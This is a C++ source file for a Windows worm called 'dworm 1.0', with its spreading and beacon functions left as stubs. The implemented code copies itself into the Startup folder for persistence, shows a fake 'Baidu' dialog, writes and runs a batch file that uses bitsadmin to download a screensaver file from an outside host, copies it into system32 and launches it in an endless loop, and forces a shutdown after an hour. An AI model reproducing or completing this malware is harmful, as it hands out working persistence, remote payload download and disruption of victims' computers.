/* dworm 1.0 - 2016 - cr4sh3r */

#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include<conio.h>
#include<stdio.h>
#include <Lmcons.h>
#include <time.h>
#include <vector>




using namespace std;

class share{
public:
	share();
	void sharen();
	void shareu();
	~share();

};

boolean ftst = true;

//  ###(CLASS_DEF_START)###

void share::sharen() {
	// Spreading tool - Internet
	//TO DO

}

void share::shareu() {
	// Spreading tool - USB
	//TO DO

}

share::share(){
	// Tells host the target is on
	//TO DO

}

share::~share(){
	// Tells host the target is off
	//TO DO
}

//  ###(CLASS_DEF_END)###


// ###(NAMESPACE_DEF_START)###

namespace payloads {

	void dildo() {
		// Displays dildos

		string echo = "@echo off";
		string filen = "SET \"FILENAME=%~dp0\\gifdil.scr\"";
		string call = "bitsadmin.exe /transfer \"down\" http://zepikao.my3gb.com/gifdil.scr \"%FILENAME%\"";


		if (::ftst == true) {
			ofstream get;
			get.open("get.bat");
			get << echo << endl;
			get << filen << endl;
			get << call << endl;
			system("start get.bat");
			system("nomousy.exe /hide");
			Sleep(30000);
			string ppdir = "\"C:\\Windows\\system32\\gifdil.scr\"";
			string zom = "copy \"gifdil.scr\"  \"" + ppdir + "\"";
			string disp = "start " + ppdir + " /s";
			system("nomousy.exe /show");
			system(zom.c_str());

			while (true) {
				Sleep(5000);
				system("cd C:\\Windows\\system32\\");
				system("start gifdil.scr /s");

			}
			
		}
		
		else {
			Sleep(5000);
		}
		
	}

	void shutd() {
		// Turns the computer off
		Sleep(3600000);
		string ftext = "Its time to sleep...";
		MessageBoxA(NULL, ftext.c_str(), "Baidu", MB_OK);
		system("shutdown /s");

	}

	void ads() {
		// Displays anoying ads
		//TO DO

	}
	

}
	
// ###(NAMESPACE_DEF_END)###

int main(int argc, char* argv[]) {
		FreeConsole();
		boolean *ft;
		ft = &ftst;
	// ###(FT_START)###

		char basePath[255] = "";
		Sleep(3000);
		string a = "\\";
		string startupdir = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
		string startupdir2 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dworm.exe";
		const int arg = system("echo %cd%");
		string dir = _fullpath(basePath, argv[0], sizeof(basePath));

		cout << startupdir2 << endl;
		cout << dir << endl;
		system("pause");

		if (dir[dir.size()] == system("echo %cd%")) {
			Sleep(1000);
			string ftext = "c4";
			MessageBoxA(NULL, ftext.c_str(), "c4", MB_OK);
			*ft = false;

		}

		else {
			string com = "copy \"" + dir +  "\"" + " " + "\"" + startupdir + "\"";
			system(com.c_str());
			string ftext = "Thank you for choosing Baidu!";
			MessageBoxA(NULL, ftext.c_str(), "Baidu", MB_OK);
		}

		// ###(FT_END)###
		

		int beast = time(0);

		if (beast % 2 == 0){
			payloads::dildo();

		}
		
		else {
			cout << "aye";
			payloads::shutd();

		}




		return 0;
	}

